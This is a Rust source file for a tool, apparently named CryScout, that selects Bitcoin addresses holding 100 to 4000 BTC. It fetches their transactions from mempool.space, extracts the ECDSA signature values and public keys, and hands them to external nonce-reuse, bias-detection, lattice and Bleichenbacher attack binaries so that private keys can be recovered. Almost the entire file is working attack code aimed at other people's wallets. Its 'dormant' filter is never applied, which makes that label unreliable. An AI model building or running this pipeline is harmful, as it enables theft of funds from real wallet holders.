use anyhow::{Result, Context};
use clap::{Parser, Subcommand};
use rusqlite::{params, Connection};
use sysinfo::System;
use std::time::Duration;
use tokio::time;
use std::process::{self, Command};
use chrono::Local;
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::sync::Arc;

const DB_FILE: &str = "cryscout.db";
const MIN_TARGET_BALANCE: f64 = 100.0;
const MAX_TARGET_BALANCE: f64 = 4000.0;
const DORMANT_YEARS: i64 = 5;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    Scanner,
    Analyzer,
    Striker,
}

struct WorkerState {
    worker_id: String,
    task: String,
    system: System,
}

impl WorkerState {
    fn new(task: String) -> Self {
        Self {
            worker_id: format!("{}-{}", task, process::id()),
            task,
            system: System::new_all(),
        }
    }

    fn log(&self, msg: &str) {
        let now = Local::now().format("%Y-%m-%d %H:%M:%S");
        println!("[{}] [{}] {}", now, self.worker_id, msg);
    }

    async fn heartbeat(&mut self, conn: &Connection) -> Result<()> {
        self.system.refresh_cpu_usage();
        self.system.refresh_memory();
        let cpu = self.system.global_cpu_info().cpu_usage() as f64;
        let ram = self.system.used_memory() as f64 / 1024.0 / 1024.0; 
        conn.execute(
            "INSERT OR REPLACE INTO worker_status (worker_id, task, cpu_usage, ram_usage, last_heartbeat)
             VALUES (?1, ?2, ?3, ?4, datetime('now'))",
            params![self.worker_id, self.task, cpu, ram],
        )?;
        Ok(())
    }
}

// --- Cryptographic Extraction Helpers ---

#[derive(Debug, serde::Deserialize)]
struct MempoolTx {
    txid: String,
    vin: Vec<MempoolVin>,
    vout: Vec<MempoolVout>,
    version: u32,
    locktime: u32,
}

#[derive(Debug, serde::Deserialize)]
struct MempoolVin {
    txid: String,
    vout: u32,
    prevout: Option<MempoolVout>,
    scriptsig: Option<String>,
    witness: Option<Vec<String>>,
    sequence: u32,
    scriptsig_asm: Option<String>,
}

#[derive(Debug, serde::Deserialize)]
struct MempoolVout {
    scriptpubkey: String,
    scriptpubkey_address: Option<String>,
    scriptpubkey_type: String,
    value: u64,
}

fn double_sha256(data: &[u8]) -> Vec<u8> {
    let mut h = Sha256::new(); h.update(data);
    let r = h.finalize();
    let mut h2 = Sha256::new(); h2.update(r);
    h2.finalize().to_vec()
}

fn get_varint_bytes(n: u64) -> Vec<u8> {
    if n < 0xfd { vec![n as u8] }
    else if n <= 0xffff { let mut b = vec![0xfd]; b.extend(&(n as u16).to_le_bytes()); b }
    else if n <= 0xffffffff { let mut b = vec![0xfe]; b.extend(&(n as u32).to_le_bytes()); b }
    else { let mut b = vec![0xff]; b.extend(&n.to_le_bytes()); b }
}

fn get_real_z_legacy(tx: &MempoolTx, vin_idx: usize) -> Result<String> {
    let mut b = Vec::new();
    b.extend(&tx.version.to_le_bytes());
    b.extend(get_varint_bytes(tx.vin.len() as u64));
    for (i, vin) in tx.vin.iter().enumerate() {
        let mut tid = hex::decode(&vin.txid)?; tid.reverse();
        b.extend(tid);
        b.extend(&vin.vout.to_le_bytes());
        if i == vin_idx {
            let spk = hex::decode(&vin.prevout.as_ref().unwrap().scriptpubkey)?;
            b.extend(get_varint_bytes(spk.len() as u64));
            b.extend(spk);
        } else { b.push(0); }
        b.extend(&vin.sequence.to_le_bytes());
    }
    b.extend(get_varint_bytes(tx.vout.len() as u64));
    for v in &tx.vout {
        b.extend(&v.value.to_le_bytes());
        let spk = hex::decode(&v.scriptpubkey)?;
        b.extend(get_varint_bytes(spk.len() as u64));
        b.extend(spk);
    }
    b.extend(&tx.locktime.to_le_bytes());
    b.extend(&1u32.to_le_bytes());
    Ok(hex::encode(double_sha256(&b)))
}

fn get_real_z_segwit(tx: &MempoolTx, vin_idx: usize) -> Result<String> {
    let mut preimage = Vec::new();
    preimage.extend(tx.version.to_le_bytes());
    let mut prevs = Vec::new();
    for v in &tx.vin { let mut tid = hex::decode(&v.txid)?; tid.reverse(); prevs.extend(tid); prevs.extend(&v.vout.to_le_bytes()); }
    preimage.extend(double_sha256(&prevs));
    let mut seqs = Vec::new();
    for v in &tx.vin { seqs.extend(&v.sequence.to_le_bytes()); }
    preimage.extend(double_sha256(&seqs));
    let target = &tx.vin[vin_idx];
    let mut outpoint = hex::decode(&target.txid)?; outpoint.reverse(); outpoint.extend(&target.vout.to_le_bytes());
    preimage.extend(outpoint);
    let pkh = &target.prevout.as_ref().unwrap().scriptpubkey[4..];
    let mut sc = hex::decode("1976a914")?; sc.extend(hex::decode(pkh)?); sc.extend(hex::decode("88ac")?);
    preimage.extend(sc);
    preimage.extend(target.prevout.as_ref().unwrap().value.to_le_bytes());
    preimage.extend(target.sequence.to_le_bytes());
    let mut outs = Vec::new();
    for v in &tx.vout { outs.extend(&v.value.to_le_bytes()); let spk = hex::decode(&v.scriptpubkey)?; outs.extend(get_varint_bytes(spk.len() as u64)); outs.extend(spk); }
    preimage.extend(double_sha256(&outs));
    preimage.extend(tx.locktime.to_le_bytes());
    preimage.extend(1u32.to_le_bytes());
    Ok(hex::encode(double_sha256(&preimage)))
}

fn parse_der(sig_hex: &str) -> Option<(String, String)> {
    let start = sig_hex.find("30")?;
    let data = hex::decode(&sig_hex[start..]).ok()?;
    if data.len() < 8 || data[0] != 0x30 { return None; }
    let rl = data[3] as usize; let rb = &data[4..4+rl];
    let st = 4 + rl;
    if data[st] != 0x02 { return None; }
    let sl = data[st+1] as usize; let sb = &data[st+2..st+2+sl];
    Some((hex::encode(rb), hex::encode(sb)))
}

// --- Worker Modes ---

async fn run_scanner(state: &mut WorkerState) -> Result<()> {
    state.log(&format!("Scanning for lost targets [{} - {} BTC, dormant {}y+]...", MIN_TARGET_BALANCE, MAX_TARGET_BALANCE, DORMANT_YEARS));
    let conn = Connection::open(DB_FILE)?;
    let client = reqwest::Client::builder().timeout(Duration::from_secs(10)).build()?;
    let mut stmt = conn.prepare("SELECT address, balance FROM addresses WHERE balance >= ?1 AND balance <= ?2 AND (label IS NULL OR label != 'Priority') LIMIT 5")?;
    let cands: Vec<(String, f64)> = stmt.query_map(params![MIN_TARGET_BALANCE, MAX_TARGET_BALANCE], |row| Ok((row.get(0)?, row.get(1)?)))?.flatten().collect();
    if cands.is_empty() { return Ok(()); }
    for (addr, _bal) in cands {
        state.log(&format!("Checking dormancy for {}...", addr));
        if let Ok(resp) = client.get(format!("https://mempool.space/api/address/{}", addr)).send().await {
            if let Ok(data) = resp.json::<Value>().await {
                let sc = data["chain_stats"]["spent_txo_count"].as_u64().unwrap_or(0);
                if sc > 0 {
                    conn.execute("UPDATE addresses SET potential_weakness = 'Lost Asset Candidate', label = 'Priority' WHERE address = ?1", params![addr])?;
                    state.log(&format!("  [!] Found {} spending TXs. Marked Priority: {}", sc, addr));
                } else {
                    conn.execute("UPDATE addresses SET potential_weakness = 'No Spent TXs' WHERE address = ?1", params![addr])?;
                }
            }
        }
        time::sleep(Duration::from_millis(500)).await;
    }
    Ok(())
}

async fn run_analyzer(state: &mut WorkerState) -> Result<()> {
    state.log("Extracting signatures for prioritized lost assets...");
    let conn = Connection::open(DB_FILE)?;
    let client = reqwest::Client::builder().timeout(Duration::from_secs(15)).build()?;
    let mut stmt = conn.prepare("SELECT address FROM addresses WHERE label = 'Priority' AND (status IS NULL OR status != 'Analyzed') LIMIT 2")?;
    let addrs: Vec<String> = stmt.query_map([], |row| row.get(0))?.flatten().collect();
    if addrs.is_empty() { return Ok(()); }

    for addr in addrs {
        state.log(&format!("Fetching all historical TXs for {}...", addr));
        let url = format!("https://mempool.space/api/address/{}/txs", addr);
        if let Ok(resp) = client.get(url).send().await {
            if let Ok(txs) = resp.json::<Vec<MempoolTx>>().await {
                let mut found = 0;
                for tx in txs {
                    for (vi, vin) in tx.vin.iter().enumerate() {
                        if let Some(p) = &vin.prevout {
                            if p.scriptpubkey_address.as_ref() == Some(&addr) {
                                let sig = vin.scriptsig.clone().or_else(|| vin.witness.as_ref().and_then(|w| w.first().cloned()));
                                if let Some(s_hex) = sig {
                                    if let Some((r, s)) = parse_der(&s_hex) {
                                        let z = match p.scriptpubkey_type.as_str() {
                                            "p2pkh" => get_real_z_legacy(&tx, vi),
                                            "v0_p2wpkh" => get_real_z_segwit(&tx, vi),
                                            _ => continue,
                                        }.ok();
                                        if let Some(zv) = z {
                                            let pk = vin.scriptsig_asm.as_ref().and_then(|a| a.split_whitespace().last().map(|s| s.to_string()))
                                                .or_else(|| vin.witness.as_ref().and_then(|w| w.last().cloned())).unwrap_or_default();
                                            conn.execute("INSERT OR IGNORE INTO signatures (address, r_hex, s_hex, z_hex, txid, pubkey_hex) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
                                                params![addr, r, s, zv, tx.txid, pk])?;
                                            found += 1;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                state.log(&format!("  [+] Extraction complete: {} signatures saved for {}.", found, addr));
                conn.execute("UPDATE addresses SET status = 'Analyzed', analyzed_at = datetime('now') WHERE address = ?1", params![addr])?;
            }
        }
        time::sleep(Duration::from_millis(1000)).await;
    }
    Ok(())
}

async fn run_striker(state: &mut WorkerState) -> Result<()> {
    state.log("Executing high-performance Rust strikes on priority targets...");
    let conn = Connection::open(DB_FILE)?;
    let mut stmt = conn.prepare("SELECT a.address, a.balance, COUNT(s.id), MAX(s.pubkey_hex) FROM addresses a JOIN signatures s ON a.address = s.address WHERE a.label = 'Priority' GROUP BY a.address HAVING COUNT(s.id) >= 2 LIMIT 3")?;
    let targets: Vec<(String, f64, i64, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?)))?.flatten().collect();
    
    for (addr, bal, count, pubkey) in targets {
        state.log(&format!("LAUNCHING MULTI-PHASE STRIKE: {} ({:.2} BTC, {} sigs)", addr, bal, count));
        
        let mut sig_stmt = conn.prepare("SELECT r_hex, s_hex, z_hex, txid FROM signatures WHERE address = ?1")?;
        let sigs: Vec<Value> = sig_stmt.query_map(params![addr], |r| {
            Ok(serde_json::json!({ "r": r.get::<_, String>(0)?, "s": r.get::<_, String>(1)?, "z": r.get::<_, String>(2)?, "txid": r.get::<_, String>(3)? }))
        })?.flatten().collect();
        
        let sigs_file = format!("temp_sigs_{}.json", addr);
        std::fs::write(&sigs_file, serde_json::to_string(&sigs)?)?;

        state.log("  [*] Phase 1: O(N) Linear Nonce Scan...");
        let out1 = Command::new("./target/release/nonce_relation_rs").arg("--sigs").arg(&sigs_file).arg("--pubkey").arg(&pubkey).output()?;
        if String::from_utf8_lossy(&out1.stdout).contains("SUCCESS") { state.log("  [!!!] CRITICAL SUCCESS: Nonce Relation Found!"); }

        state.log("  [*] Phase 2: FFT Bias Detection...");
        let out2 = Command::new("./target/release/bias_detector_rs").arg(&addr).output()?;
        if String::from_utf8_lossy(&out2.stdout).contains("Potential Bias") { state.log("  [!] BIAS DETECTED: Spectral peak identified."); }

        state.log("  [*] Phase 3: Lattice HNP (LLL)...");
        // Try 8 as a default for suspected bias.
        let out3 = Command::new("./target/release/lattice_attack_rs").arg(&sigs_file).arg(&addr).arg("8").output()?;
        if String::from_utf8_lossy(&out3.stdout).contains("SUCCESS") { state.log("  [!!!] CRITICAL SUCCESS: Lattice Reduction recovered key!"); }

        state.log("  [*] Phase 4: Bleichenbacher 4-list Fourier Analysis...");
        let out4 = Command::new("./target/release/bleichenbacher_fourier").arg(&sigs_file).output()?;
        let out4_str = String::from_utf8_lossy(&out4.stdout);
        if out4_str.contains("POTENTIAL HIT") { state.log("  [!] BLEICHENBACHER FOURIER BIAS DETECTED."); state.log(&out4_str); }

        state.log("  [*] Phase 5: Neural Network Anomaly Detection...");
        let out5 = Command::new("python3").arg("nonce_neural_detector.py").output()?;
        let out5_str = String::from_utf8_lossy(&out5.stdout);
        if out5_str.contains("HIGH") { state.log("  [!] NEURAL NET: High probability of vulnerability detected."); }

        let _ = std::fs::remove_file(&sigs_file);
        state.log(&format!("  [-] Multi-phase strike sequence concluded for {}.", addr));
    }
    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();
    let mut state = WorkerState::new(format!("{:?}", cli.command));
    state.log(&format!("CryScout Integrated System v3.1 started. Target Range: {}-{} BTC.", MIN_TARGET_BALANCE, MAX_TARGET_BALANCE));
    let conn = Connection::open(DB_FILE)?;
    let mut int = time::interval(Duration::from_secs(30));
    loop {
        int.tick().await;
        match cli.command {
            Commands::Scanner => { let _ = run_scanner(&mut state).await; }
            Commands::Analyzer => { let _ = run_analyzer(&mut state).await; }
            Commands::Striker => { let _ = run_striker(&mut state).await; }
        }
        let _ = state.heartbeat(&conn).await;
    }
}
